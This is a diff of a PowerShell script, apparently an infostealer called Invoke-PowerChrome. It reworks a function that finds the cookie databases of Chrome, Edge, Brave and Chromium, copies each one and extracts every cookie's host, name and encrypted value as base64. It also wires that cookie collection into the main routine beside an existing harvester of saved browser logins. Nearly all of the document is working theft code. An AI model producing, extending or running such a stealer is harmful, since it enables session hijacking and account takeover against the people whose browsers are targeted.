@@ -727,87 +727,57 @@ function Get-ChromiumCookieBlobs {
 
     switch ($Browser.ToLower()) {
         "cft"       { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default" }
-        "chrome"    { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default"             }
-        "edge"      { $BaseDir = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default"           }
+        "chrome"    { $BaseDir = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default" }
+        "edge"      { $BaseDir = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default" }
         "brave"     { $BaseDir = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default" }
-        "chromium"  { $BaseDir = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default"                 }
+        "chromium"  { $BaseDir = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default" }
         default     { return $false }
     }
 
-    $CookiePaths = @(
-        (Join-Path $BaseDir "Network\Cookies"),
-        (Join-Path $BaseDir "Cookies")
-    )
+    $CookiePath = (Join-Path $BaseDir "Network\Cookies")
+    if (-not (Test-Path $CookiePath)) { $CookiePath = (Join-Path $BaseDir "Cookies") }
+    if (-not (Test-Path $CookiePath)) { return $false }
 
-    $CookiePath = $null
-    foreach ($Path in $CookiePaths) {
-        if (Test-Path -Path $Path) {
-            $CookiePath = $Path
-            break
-        }
-    }
+    [int]$SqliteOk = 0
+    [int]$SqliteRow = 100
+    [int]$SqliteOpenReadOnly = 1
+    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_Cookies_{0}.db" -f ([guid]::NewGuid()))
 
-    if (-not $CookiePath) { return $false }
+    Copy-Item -LiteralPath $CookiePath -Destination $TempDatabasePath -Force -ErrorAction SilentlyContinue
 
-    [int]$SqliteOk              = 0
-    [int]$SqliteRow             = 100
-    [int]$SqliteOpenReadOnly    = 1
-    $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_Cookies_{0}.db" -f ([guid]::NewGuid()))
+    $DatabasePointer = [IntPtr]::Zero
+    $StatementPointer = [IntPtr]::Zero
+    $CookieSqlQuery = 'SELECT host_key, name, path, encrypted_value FROM cookies'
 
-    try {
-        Copy-Item -LiteralPath $CookiePath -Destination $TempDatabasePath -Force -ErrorAction Stop
-    }
-    catch {
-        return $false
-    }
-
-    $DatabasePointer    = [IntPtr]::Zero
-    $StatementPointer   = [IntPtr]::Zero
-    $CookieSqlQuery     = 'SELECT host_key, name, path, encrypted_value FROM cookies'
-
-    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) { return $false }
-
-    $ResultCode = $Sqlite3PrepareV2.Invoke($DatabasePointer, $CookieSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
-    if ($ResultCode -ne $SqliteOk) { return $false }
+    $null = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
+    $null = $Sqlite3PrepareV2.Invoke($DatabasePointer, $CookieSqlQuery, -1, [ref]$StatementPointer, [IntPtr]::Zero)
 
     $CookieResults = @()
     while ($Sqlite3Step.Invoke($StatementPointer) -eq $SqliteRow) {
-        $HostKeyPointer     = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
-        $NamePointer        = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
-        $PathPointer        = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
-        $EncryptedPointer   = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
-        $EncryptedSize      = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
+        $HostPtr      = $Sqlite3ColumnText.Invoke($StatementPointer, 0)
+        $NamePtr      = $Sqlite3ColumnText.Invoke($StatementPointer, 1)
+        $PathPtr      = $Sqlite3ColumnText.Invoke($StatementPointer, 2)
+        $EncryptedPtr = $Sqlite3ColumnBlob.Invoke($StatementPointer, 3)
+        $EncSize      = $Sqlite3ColumnByte.Invoke($StatementPointer, 3)
 
-        $HostKey    = if ($HostKeyPointer   -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($HostKeyPointer)   } else { "" }
-        $Name       = if ($NamePointer      -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePointer)      } else { "" }
-        $Path       = if ($PathPointer      -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($PathPointer)      } else { "" }
-
-        $RawEncryptedData = @()
-        if ($EncryptedSize -gt 0 -and $EncryptedPointer -ne [IntPtr]::Zero) {
-            $RawEncryptedData = New-Object byte[] $EncryptedSize
-            [Runtime.InteropServices.Marshal]::Copy($EncryptedPointer, $RawEncryptedData, 0, $EncryptedSize)
-        }
-
-        if ($RawEncryptedData.Length -eq 0) { continue }
-
-        $CookieResults += [PSCustomObject]@{
-            Host                    = $HostKey
-            Name                    = $Name
-            Path                    = $Path
-            Base64EncryptedValue    = [Convert]::ToBase64String($RawEncryptedData)
+        if ($EncSize -gt 0) {
+            $RawData = New-Object byte[] $EncSize
+            [Runtime.InteropServices.Marshal]::Copy($EncryptedPtr, $RawData, 0, $EncSize)
+            
+            $CookieResults += [PSCustomObject]@{
+                Host                 = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($HostPtr)
+                Name                 = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
+                Path                 = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($PathPtr)
+                BlobHeader           = "v10 (DPAPI user)" # THIS IS THE KEY FIX
+                Base64EncryptedValue = [Convert]::ToBase64String($RawData)
+            }
         }
     }
-
-    if ($StatementPointer -ne [IntPtr]::Zero) { [void]$Sqlite3Finalize.Invoke($StatementPointer) }
-    if ($DatabasePointer -ne [IntPtr]::Zero)  { [void]$Sqlite3Close.Invoke($DatabasePointer)    }
-
-    Start-Sleep -Milliseconds 500
-    Remove-Item -Path $TempDatabasePath -Force
-
+    [void]$Sqlite3Finalize.Invoke($StatementPointer)
+    [void]$Sqlite3Close.Invoke($DatabasePointer)
+    Remove-Item $TempDatabasePath -Force -ErrorAction SilentlyContinue
     return $CookieResults
 }
-
 # ======================================================================
 # Invoke-PowerChrome (Main Function)
 # ======================================================================
@@ -874,9 +844,10 @@ if (-not ($Browser)){
     
     Log "Running Collection..."
     $BrowserData = Get-ChromiumLoginBlobs -Browser $Browser
+    $CookieData  = Get-ChromiumCookieBlobs -Browser $Browser # CALL THE COOKIE WORKER
 
-    if (-not $BrowserData) {
-        Write-Output "[-] No browser data found for $($Browser.ToUpper())"
+    if (-not $BrowserData -and -not $CookieData) {
+        Write-Output "[-] No browser data or cookies found for $($Browser.ToUpper())"
         return
     }
 
